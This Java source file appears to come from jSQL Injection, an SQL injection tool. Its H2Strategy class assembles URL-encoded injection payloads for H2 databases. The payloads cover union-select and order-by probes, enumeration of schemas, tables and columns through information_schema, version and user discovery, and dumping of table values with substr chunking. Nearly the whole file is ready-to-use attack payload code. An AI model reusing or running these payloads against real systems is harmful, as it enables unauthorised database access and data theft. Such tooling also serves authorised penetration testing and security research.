package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class H2Strategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "concat(" +
                "" +
                    "concat_ws(" +
                        "'{%}'," +
                        "H2VERSION()," +
                        "database()," +
                        "user()," +
                        "CURRENT_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "cast(q+as+char)||" +
                        "'%04'" +
                        "+order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "cast(TABLE_SCHEMA+as+char)r," +
                    "count(TABLE_NAME)q+" +
                "from+" +
                    "INFORMATION_SCHEMA.tables+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getTableList(Database database) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(r+as+char)||" +
                        "'%050%04'+" +
                        "order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "TABLE_NAME+r+" +
                "from+" +
                    "information_schema.tables+" +
                "where+" +
                    "TABLE_SCHEMA='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getColumnList(Table table) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(n+as+char)||" +
                        "'%050%04'+" +
                        "order+by+n+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "COLUMN_NAME+n+" +
                "from+" +
                    "information_schema.columns+" +
                "where+" +
                    "TABLE_SCHEMA='" + table.getParent() + "'+" +
                    "and+" +
                    "TABLE_NAME='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", "`,'%00')),'%7f',trim(ifnull(`");
        
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,'%00'))";
        
        return 
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "cast(q+as+char)||" +
                    "'%04'" +
                    "+order+by+r+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")from(" +
                "select+" +
                    "cast(concat(" + formatListColumn + ")as+char)r," +
                    "count(*)q+" +
                "from+" +
                    "`" + database + "`.`" + table + "`+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
        "(" +
            "select+" +
                /**
                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                 */
                "concat(" +
                    "'SQLi'," +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        /**
                         * Minus 'SQLi' should apply
                         */
                        MediatorModel.model().performanceLength +
                    ")" +
                ")" +
        ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+concat('SQLi',$1,repeat('%23',65536),'%01%03%03%07'))"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("''||1337"+ i +"7330%2b1");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }

    @Override
    public String getDbLabel() {
        return "H2";
    }
}